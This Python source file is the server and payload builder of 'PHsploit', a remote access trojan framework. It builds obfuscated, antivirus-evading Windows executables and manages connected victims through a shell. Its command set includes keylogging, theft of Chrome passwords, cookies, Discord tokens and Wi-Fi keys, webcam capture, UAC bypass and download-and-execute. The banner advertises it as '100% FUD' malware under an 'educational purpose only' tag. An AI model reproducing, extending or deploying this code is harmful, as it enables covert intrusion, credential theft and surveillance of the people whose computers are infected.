import socket
import requests
import json
import colored
import time
from plyer import notification
import os
import threading
from os.path import *

bannar_color =[

colored.fg("yellow") + colored.attr("bold"),
colored.fg("white") + colored.attr("bold"),
colored.fg("green") + colored.attr("bold"),
colored.fg("#bc000b") + colored.attr("bold"),#red
colored.fg("blue") + colored.attr("bold"),
]
#==turquoise_2=============#ff013c=================================

Y = bannar_color[0] #yellow
G = bannar_color[2] #green
R = bannar_color[3] #red
B = bannar_color[4] #red
W = bannar_color[1]#white
def authuser():
    u = open('user.txt', 'r').read()
    if u == 'PHsquad':
        pass
    else:
        uu = str(input(G + '\n[+]Enter Username: '))
        if uu == 'PHsquad':
            with open('user.txt', 'w') as um:
                um.write(uu)
        else:
            print(R +'\n[+]Invalid Username !')
            authuser()
def authpass():
    p = open('pass.txt', 'r').read()
    if p == '28pU^S\ZZk*{4)%.':
        pass
    else:
        pp = str(input(G + '\n[+]Enter Password: '))
        if pp == '28pU^S\ZZk*{4)%.':
            with open('pass.txt', 'w') as pm:
                pm.write(pp)
        else:
            print(R +'\n[+]Invalid Password !')
            authpass()
authuser()
authpass()
print(G + '\n[+]Login Successfull')
time.sleep(2)
os.system('clear')


f = open('serverport.txt', 'r').read()
if f == "{}" or "":
    serverport = input(R + '\nNo Port Detected in serverport.txt' + W + '\nEnter serverport: ')
    with open('serverport.txt', 'w') as port:
        port.write(serverport)
keys = open('key.txt', 'r').read()
if keys == "{}" or "":
    key = input(R + '\nNo Key Detected in key.txt' + W + '\nEnter serverkey: ')
    with open('key.txt', 'w') as keyser:
        keyser.write(key)


def replace_string(filename, old_string, new_string):
    with open(filename) as f:
        s = f.read()
        if old_string not in s:
            return

    with open(filename, 'w') as f:
        s = s.replace(old_string, new_string)
        f.write(s)


def build():
    global key
    try:
        import socket
        import json
        import subprocess
        import os
        import pyautogui
        import threading
        import shutil
        import sys
        from os.path import isfile
        import random
        import string
        from requests import get
        from webbrowser import open as op
        import getpass
        import ctypes
        from pynput.keyboard import Listener
        import time
        import win32crypt
        import sqlite3
        import base64
        from PIL import ImageGrab
        from urllib.request import Request, urlopen

        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives.ciphers import (
            Cipher, algorithms, modes)
    except Exception as moderror:
        print(moderror)
        print(R + '\nRun installer.bat and restart the tool\n')
        exit()
    else:
        def genkey(length: int) -> bytes:
            return os.urandom(length)

        def xor_strings(s, t) -> bytes:
            if isinstance(s, str):
                # Text strings contain single characters
                return b"".join(chr(ord(a) ^ ord(b)) for a, b in zip(s, t))
            else:

                return bytes([a ^ b for a, b in zip(s, t)])

        print(f"""
{W}1) {Y}Manually Enter LHOST and LPORT
{W}2) {Y}Grab lhost,lport from pastebin [ex:127.0.0.1:4444]
        """)
        c = int(input(G + 'Choose: ' + W + ''))
        if c == 1:

            lhost = input(B + '\n[+]' + G + 'Enter lhost: ' + W + '')
            keyhost = genkey(len(lhost))
            cryptedhost = xor_strings(lhost.encode('utf8'), keyhost)

            lport = input(B + '[+]' + G + 'Enter lport: ' + W + '')
            keyport = genkey(len(lport))
            cryptedport = xor_strings(lport.encode('utf8'), keyport)
            icon = ""
            while isfile(icon) == False:
                icon = input(B + '[+]' + G + 'Enter payload icon: ' + W + '')
            os.system('powershell -c cd stub; cp payload.py ..')
            replace_string('payload.py', '$lhost', str(cryptedhost))
            replace_string('payload.py', '$lport', str(cryptedport))
            replace_string("payload.py","$hostkey",str(keyhost))
            replace_string("payload.py","$portkey",str(keyport))
            key = open('key.txt', 'r').read()
            replace_string('payload.py', '$key', key)

            print(G + '\n[+]Compiling\n' + W + '')
            os.system('python -m PyInstaller --noconfirm --onefile --windowed  --icon  "' + icon + '"  "payload.py"')

            os.system('powershell -c cd dist; cp payload.exe ..')
            os.remove('payload.py')
        elif c == 2:
            URL = input(B + '\n[+]' + G + 'Enter url: ' + W + '')
            u = requests.get(URL).text
            sp = u.split(':')
            print(B + '\n[+]' + G + 'LHOST is: ' + W + '' +sp[0]+ B + '\n[+]' + G + 'LPORT is: ' + W + '' +sp[1])
            os.system('powershell -c cd stub; cp payload-pastebin.py ..')
            ask = input(W + '\nConfirm lhost and lport(' + G + 'y' + W + '/' + R + 'n' + W + ')? ')
            if ask == 'y':
                replace_string('payload-pastebin.py','$pastebin',URL)
                replace_string('payload.py', '$key', key)
                icon = ''
                while isfile(icon) == False:
                    icon = input(B + '\n[+]' + G + 'Enter payload icon: ' + W + '')
                print(G + '\n[+]Compiling\n' + W + '')
                os.system('python -m PyInstaller --noconfirm --onefile --windowed  --icon "' + icon + '"  "payload-pastebin.py"')

                os.system('powershell -c cd dist; cp payload-pastebin.exe ..')
            else:
                os.remove('payload-pastebin.py')
                build()
        else:
            build()


def info():
    print(f"""
                           {W},╦▒▒▒╜╙        ,▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒╗
                       ,╔É░▒▒░         ,╓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
                    ,m▒░▒▒▒▒     ,,╓p▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
                  g▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
               ,Θ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
             ╓▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
           ,▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
          Æ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
        ,▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
       /░▒▒▒▒▒▒▒╜`     ``"╙╨▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    ╓Ñ▓░▒▒▒▒▒▒▒▒╖     {R}▀{W}       ,▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒
  ╓▒▒▐░▒▒▒▒▒▒▒▒▒▒▒%╦╖╓,,,,╓╓m▒░▒▒╢▒▒▒▒▒▒▒▒▒▒▒▒▒`       `"╜╩▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 ╒░▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▒       {R}▀{W}       ╙Ñ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 ▐▒▒▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒╖,           ,m░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 ▐░▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒%▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
  ▓▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▌░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
  ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
  ▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
  ▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
  ▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▀█▓▄▄░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▓▓▒
  ▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▀▓╣╢╣╣╢╢╢╢▓▓▓╣@@@@@╥▄▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░╣╫▌▒
  ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒╙╬▓╣╣╣╢╣╢▓▓▓╨╜▒░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▄▓▓▓▒░▒▒
   ▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░▒▒▒▒▒▒
  æ░▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░╩╜
M`   ▀░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓╬▓▓▓▀▀▓╙'
       Ñ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒æ▓▓▓▌▒╢╢╢╣  ╘
      ,╢▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▄▓▓▓╢▓▓█▒╢╢╢╢╢╣  ▓
     g╢▒▒╣╜`╙Ñ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒µ▄▓▓▓╢╢▓▓▓▓▓▓▓█▒╢╢╢╢╢╣░ ▐
   ╓╣▒╣╜    ,@╢▒▒▓▄▄▄░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒@@▓▓▓▓▓▓▓╢╢▓▓▓▓▓▓▓▓▓▓▓▓▓▓▌╢╢╢╢╢╢  ╟«w,
 ╥╣Ñ╜     ,@╢▒╩▓▀░░▓▓▓╢╢╢╢╢▓▓▓▓▓▓▓╢╢╢╢╢▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▌╢╢╢╢╢`  ▌    ⁿ╖
                                                                     
                                                    {Y}"Hi there, I'm Saitama hope your are ready for a punch.Hahaha just kidding.Listen PHsploit is a
pytohn based windows exploitation framework.It comes with various kinds of features.It creates 100% undetectable python based .exe files with the help of pyinstaller.
By the way thnak you for using {R}PHsploit !!"

{W}+===============================================+                                                                          
|...................{G}PHsploit{W}....................|                                                                          
{R}+-----------------------------------------------+                                                                          
{W}|{G}#Created By {B}=>>       {W}R00tDev1l                |                                                                          
{W}|{G}#Contact{B}==> {W}facebook.com/Agent.CCCP.11267KGB   |                                                                          
{W}|{G}#Date Created {B}==>      {W}30 January 2022         |
{W}|{G}#Last Update  {B}==>      {W}5  May 2022             |                                                                          
{W}|{G}#Join{B}=>> {W}Gray Hat Hackers Community on Facebook|                                                                          
{W}|{G}#mail{B}=>>{W} indradas4863@gmail.com                |                                                                          
{W}|{G}#Note{B}=>> {R}Educational purpose only!             {W}|                                                                          
+===============================================+
   """)

def banner():
    print(f"""

                                                            {W}@@(                 
                                  .@@@@@@@@@@@&&&@@*    ,@@@.                   
                              (@@@@(              .@@@@@@                       
                            @&@,         ,%%%*                                  
                          @&@       @@&@@*   .%@&@@                             
                         @@@     *@@%             @@@                           
                        @@@     *@@                #@@                          
   {R}./(%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#/,   
                     {G}/@@ @&(     @&#        @@%    (@@                          
                    %@@   @@@      @&@@&@&&@&     (&@                           
                   @@@      @@@                 (@@(                            
                  @&@@@@&(*   &@@&@.        %@@@&                               
                                ,#&@@@@@@#.                                                                       

{W}-------------------------------------------------------------------------------------

{W}██████{R}╗ {W}██{R}╗  {W}██{R}╗{W}███████{R}╗{W}██████{R}╗ {W}██{R}╗      {W}██████{R}╗ {W}██{R}╗{W}████████{R}╗
{W}██{R}╔══{W}██{R}╗{W}██{R}║  {W}██{R}║{W}██{R}╔════╝{W}██{R}╔══{W}██{R}╗{W}██{R}║     {W}██{R}╔═══{W}██{R}╗{W}██{R}║╚══{W}██{R}╔══╝
{W}██████{R}╔╝{W}███████{R}║{W}███████{R}╗{W}██████{R}╔╝{W}██{R}║     {W}██{R}║   {W}██{R}║{W}██{R}║   {W}██{R}║   
{W}██{R}╔═══╝ {W}██{R}╔══{W}██{R}║╚════{W}██{R}║{W}██{R}╔═══╝ {W}██{R}║     {W}██{R}║   {W}██{R}║{W}██{R}║   {W}██{R}║   
{W}██{R}║     {W}██{R}║  {W}██{R}║{W}███████{R}║{W}██{R}║     {W}███████{R}╗╚{W}██████{R}╔╝{W}██{R}║   {W}██{R}║   
╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝  {W}PHsploit Framework{Y}(2.5) {W}by {R}R00tDev1l


{B}[+]{W}This tool creates {R}100% FUD{W} python .exe type payload for hacking windows.
{B}[+]{W}This tool can be used in {R}WINDOWS{W} only.
{B}[+]{W}Do not upload payloads in {R}VIRUSTOTAL{W} its already FUD.

""")


def reliable_recv(target):
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def reliable_send(target, data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())


def upload_file(target, file_name):
        f = open(file_name, 'rb')
        target.send(f.read())






def download_file(target,file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()





def target_communication(target, ip):
    try:
        count = 0
        while True:
            print(G + '\n┌──Shell~' + W + '%s ' % str(ip))
            command = input(G + '└─$ ' + W + '')
            reliable_send(target, command)
            if command == 'quit':
                targets.remove(target)
                ips.remove(ip)
                users.remove(users[num])
                break

            elif command == 'back':
                break
            elif command == 'clear':
                os.system('cls')
            elif command[:6] == 'upload':
                print(Y + "\n[*]Uploading File\n")
                try:
                    upload_file(target, command[7:])
                except:
                    print(R + '\nSomething wrong\n')
                else:
                    print(G + "\n[+]File Uploaded\n")
                    pass
                    
            elif command[:8] == 'download':

                    print(Y + '\n[*]Downloading ' + command[9:])

                    try:
                        download_file(target, command[9:])
                    except:
                        print(R + "\n[-]Sorry can't download the file\n")
                    else:
                        print(G + '\n[+]File Downloaded\n')
            elif command[:10] == 'screenshot':
                print(Y + "\n[*]Taking Screenshot\n")
                try:
                    f = open('screenshot%d' % (count) + '.png', 'wb')
                    target.settimeout(3)
                    chunk = target.recv(1024)
                    while chunk:
                        f.write(chunk)
                        try:
                            chunk = target.recv(1024)
                        except socket.timeout as e:
                            break
                    target.settimeout(None)
                    f.close()

                except:
                    print(R + "\n[-]Can't take screenshot\n")
                else:
                    print(G + "\n[+]Screenshot saved as screenshot%d" % (count) + ".png\n")
                    count += 1
            elif command == 'help':
                print((f'''{W}\n
                    quit                                --> Quit session 
                    back                                --> Background session 
                    appdata                             --> Redirect to roaming
                    pwd                                 --> Show current directory
                    isopen                              --> Scan a client port [isopen ip:port]
                    clear                               --> Clear The screen
                    cd path                             --> Change directory 
                    upload filename                     --> Upload file
                    download filename                   --> Download file
                    keylog_start                        --> Start keylogger
                    keylog_dump                         --> Read keylogged logs
                    keylog_stop                         --> Stop keylogger
                    open_link                           --> Open a URL [open_link https://www.facebook.com/groups/grayhathackerscommunity]
                    screenshot                          --> Screenshot
                    dexec                               --> Download and execute from internet [dexec 127.0.0.1/file.exe]
                    start                               --> Execute a .exe file
                    run-pwr                             --> Execute powershell command [run-pwr Write-Host 'Hello, World!']
                    msgbox                              --> Show msgbox [msgbox|yourtitle|yourtext]
                    chrome_recon                        --> Dump Chrome Passwords
                    Get-Cookies                         --> Grab Cookies From Chrome
                    webcam_list                         --> Get available webcam sources ID
                    webcam_snap                         --> Snap picture from target webcam [webcam_snap 0]
                    disteal                             --> Get Discord tokens
                    getuser                             --> Show username
                    bypass-uac                          --> Bypass UAC *This exploit might not work or can get detected
                    priv                                --> Check User Priv
                    sysinfo                             --> Get system information
                    Get-Wifi                            --> Grab Wifi Passwords
                    getip                               --> System Public IP
                    say                                 --> Target Computer Speaks [say This is a test]
                    clip                                --> Change clipoard data [clip Hello_There] *No spaces allowed 
                    pslist                              --> Running proccesses 
                    playsound                           --> Play music(Win-10) [playsound music.wav] *The .wav file must be in your PHsploit directory
                    kill                                --> kill proccess with PID [kill 1009]
                    changepolicy                        --> Set Execution Policy Bypass
                    cwallpaper                          --> Change wallpaper [cwallpaper image/path/in/your/computer/yourpic.jpg]'''))
           
            elif command[:11] == "webcam_snap":
                print(Y + '\n[*] Openning Webcam\n')
                try:
                    download_file(target,'webcam.jpg')
                except:
                    print(R + "\n[-]Blank image detected\n")
                else:
                    print(G + "\n[+] Image Captured\n")
                    os.system('start webcam.jpg')
                    
            elif command[:10] == "bypass-uac":
                print(Y + "\n[*]Killing User Acces session, please wait for Admin Access session.\n")
                targets.remove(target)
                ips.remove(ip)
                users.remove(users[num])
            
            elif command[:5] == 'dexec':
                print(target.recv(1024).decode('utf-8'))
                
            elif command[:10] == 'cwallpaper':
                if isfile(command[11:]) == True:
                    print(Y + "\n[*]Uploading Picture\n")
                    try:

                        upload_file(target, command[11:])
                        reliable_send(target, 'somedata')
                    except:
                        print(R + "\n[-]Something Wrong\n")
                    else:
                        print(G + "\n[+]Wallpaper changed\n")
                else:
                    print(R + "\n[-]File Not Found\n")
            elif command[:5] == 'start':
                print(target.recv(1024).decode())
                
            elif command[:9] == 'playsound':
                if command[10:][-4:] != '.wav':
                    target.send('nsupport'.encode())
                    print(target.recv(1024).decode())


                else:
                    target.send('supported'.encode())
                    print(Y + "\n[*]Uploading .wav file\n")
                    try:
                        upload_file(target,command[10:])
                    except:
                        print(R + "\n[-]Failed uploading the file\n")
                    else:
                        print(G + "\n[+]Music played successfully\n")

            elif command[:11]== "Get-Cookies":
                username = target.recv(1024).decode()
                with open("Chrome-"+username+".txt",'w') as cookeis:
                    cookeis.write(reliable_recv(target))
                    cookeis.close()
                print(G + "\n[+]Cookies Saved As Chrome-"+username+".txt\n")
            else:
                result = reliable_recv(target)
                print(result)
    except:
        targets.remove(target)
        ips.remove(ip)
        users.remove(users[num])
        print(R + "\n[-]Session lost\n")


def accept_connections():
    global clients
    global  user
    while True:
        if stop_flag:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            key = open('key.txt', 'r').read()
            cred = target.recv(1024).decode().split(':')
            user = cred[1]
            if  cred[0]== key and user not in users:
                users.append(user)
                targets.append(target)
                ips.append(ip)
                notification.notify(
                title = "PHsploit Connection\n",
                message = str(ip) + " has connected!",
                timeout = 10
                )
                clients += 1

                
            else:
                reliable_send(target,"quit")
                pass


        except:
            pass


clients = 0
users = []
targets = []
ips = []

stop_flag = False
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
p = open('serverport.txt', 'r').read()
sock.bind(('', int(p)))
sock.listen(5)
t1 = threading.Thread(target=accept_connections)
t1.start()
banner()

try:
  while True:
    import subprocess as sp
    acc = sp.getoutput('whoami')
    print(G + '┌──PHsploit─(' + W +  acc + G +  ')')
    command = input(G + '└─$ ' + W + '')
    if command == 'hacked':
        counter = 0

        for ip in ips:
            print(W + 'Session ' + Y + str(counter) + W +  ' --- ' + Y + str(ip))
            counter += 1
    elif command == 'clear':
        os.system('cls')
    elif command[:7] == 'connect':
        try:
            global num
            num = int(command[8:])
            tarnum = targets[num]
            tarip = ips[num]
            target_communication(tarnum, tarip)
        except:


            print(R + '\n[-]No Session for that number or session lost')
    elif command == 'help':
        print(f"""
    {W}build           --> build payload
    info            --> Information about the tool
    connect         --> connect to target[connect 0]
    sendall         --> send command to all targets[sendall shutdown -s -t 0]
    kill            --> kill session[kill 0]
    hacked          --> see connected targets
    exit            --> exit the tool
    clear           --> clear the screen
    help            --> show this messeage
            """)
    elif command == 'banner':
        banner()
    elif command == 'build':
        build()
    elif command[:6] == 'rmlist':
        try:
            targ = targets[int(command[7:])]
            ip = ips[int(command[7:])]
            targets.remove(targ)
            ips.remove(ip)
            users.remove(users[int(command[7:])])
        except:
            print(R + '\n[-]This session not available')

    elif command == 'exit':
        for target in targets:
            reliable_send(target, 'quit')
            target.close()
        sock.close()
        stop_flag = True
        t1.join()
        break
    elif command == 'clear':
        os.system('cls')
        
    elif command == 'info':
         info()
    elif command[:4] == 'kill':
        targ = targets[int(command[5:])]
        ip = ips[int(command[5:])]
        reliable_send(targ, 'quit')
        targ.close()
        targets.remove(targ)
        ips.remove(ip)
        users.remove(int(command[5:]))

    elif command[:7] == 'sendall':
        x = len(targets)
        i = 0
        try:
            while i < x:
                tarnumber = targets[i]
                print(G + "\n[+]Executed on "+ Y +str(ips[i][0]))
                reliable_send(tarnumber, command)
                i += 1
        except Exception as E:
            print(str(E))
            print(R + '\n[-]Failed\n')
    else:
        print(R + '\n[-]Error command 404')
except KeyboardInterrupt:
       for target in targets:
            reliable_send(target, 'quit')
            target.close()
       sock.close()
       stop_flag = True
       t1.join()
     
      
